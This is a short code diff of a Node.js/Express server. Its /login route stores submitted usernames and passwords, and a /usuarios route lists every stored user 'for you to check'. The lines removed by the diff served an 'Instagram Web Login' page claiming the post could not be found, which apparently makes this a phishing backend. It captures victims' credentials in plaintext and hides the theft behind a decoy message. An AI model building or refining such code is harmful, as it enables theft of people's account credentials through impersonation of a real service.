@@ -37,26 +37,13 @@ app.post("/login", (req, res) => {
     [username, password],
     function (err) {
       if (err) console.error(err.message);
-
-      res.send(`<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8" />
-  <title>Instagram Web Login</title>
-  <style>
-    body { background:#fff; color:#000; font-family:Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-    h1 { font-size:20px; font-weight:normal; }
-  </style>
-</head>
-<body>
-  <h1>Não foi possível localizar a postagem</h1>
-</body>
-</html>`);
+      res.sendStatus(200);
     }
   );
 });
 
-// Lista usuários (pra você conferir)
+
+// Lista usuários (para você conferir)
 app.get("/usuarios", (req, res) => {
   db.all("SELECT * FROM usuarios", [], (err, rows) => {
     if (err) return res.send("Erro ao buscar usuários");
@@ -68,3 +55,4 @@ app.get("/usuarios", (req, res) => {
 });
 
 app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
+
